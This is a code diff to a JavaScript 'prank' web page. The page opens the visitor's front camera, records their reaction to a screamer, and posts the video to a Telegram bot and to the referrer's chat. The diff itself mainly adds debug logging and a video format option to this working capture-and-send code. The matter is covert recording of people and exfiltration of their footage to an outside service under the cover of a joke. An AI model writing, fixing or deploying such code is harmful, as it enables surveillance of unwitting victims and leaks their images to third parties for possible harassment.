@@ -31,6 +31,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Start the prank: access camera, record video, play screamer
     async function startPrank() {
+        console.log('Starting prank');
         try {
             // Request access to the front camera
             const stream = await navigator.mediaDevices.getUserMedia({
@@ -64,20 +65,25 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Start recording video
     function startRecording(stream) {
-        recorder = new MediaRecorder(stream);
+        console.log('Starting recording');
+        const options = { mimeType: 'video/webm' };
+        recorder = new MediaRecorder(stream, options);
         recorder.start();
     }
 
     // Stop recording and send video
     function stopRecording() {
+        console.log('Stopping recording');
         recorder.stop();
         recorder.ondataavailable = e => {
+            console.log('Data available, blob size:', e.data.size);
             sendVideoToBot(e.data);
         };
     }
 
     // Send video to Telegram bot
     function sendVideoToBot(blob) {
+        console.log('Sending video to bot, blob size:', blob.size);
         const caption = 'Видео реакции на скример';
 
         // Send to referrer
@@ -89,6 +95,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function sendVideoToChat(chatId, blob, caption) {
+        console.log(`Sending video to chat ${chatId}, blob size: ${blob.size}`);
         const formData = new FormData();
         formData.append('video', blob);
         formData.append('caption', caption);
@@ -97,7 +104,10 @@ document.addEventListener('DOMContentLoaded', () => {
             method: 'POST',
             body: formData
         })
-        .then(response => response.json())
+        .then(response => {
+            console.log(`Response status: ${response.status}`);
+            return response.json();
+        })
         .then(data => {
             if (data.ok) {
                 console.log(`Video sent to ${chatId} successfully`);
